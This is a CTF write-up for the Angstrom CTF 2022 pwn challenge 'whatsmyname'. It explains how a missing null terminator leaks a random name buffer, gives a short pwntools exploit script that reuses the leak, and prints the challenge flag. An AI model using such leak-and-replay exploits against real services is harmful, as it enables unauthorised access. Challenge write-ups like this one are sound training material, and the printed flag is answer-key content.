---
title: "[Pwn] whatsmyname [Angstrom CTF 2022]"
date: 2022-05-06 23:37:00
---

# 0x0 Introduction

Can you guess my name?

nc challs.actf.co 31223

whatsmyname whatsmyname.c

Author: JoshDaBosh

files: [whatsmyname](whatsmyname), [whatsmyname.c](whatsmyname.c)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```


# 0x2 Vulnerability

The program basically wanna us to enter 48 bytes `guess`, program will generate 48 bytes `myname` from `/dev/urandom`. if `guess` and `myname` is same, program will print out the flag.

it is not possible to guess it right. However, we can use null-terminated string bug to leak `myname`. Then we can enter the same name to get the flag.

# 0x3 Exploit

```
io = start()

# for buffering stuff
input("A")
io.sendafter(b"name? ",b"A"*45+b"END")
print(io.recvuntil(b'END'))
name = io.recvuntil(b"!\nGuess",drop=True)
print(name,len(name))
# for buffering stuff
input("A")
io.sendlineafter(b"flag!\n",name+b'\x00')
io.interactive()
```

# 0x4 Flag

actf{i_c0uld_be_l0nely_with_y0u_a21f8611c74b}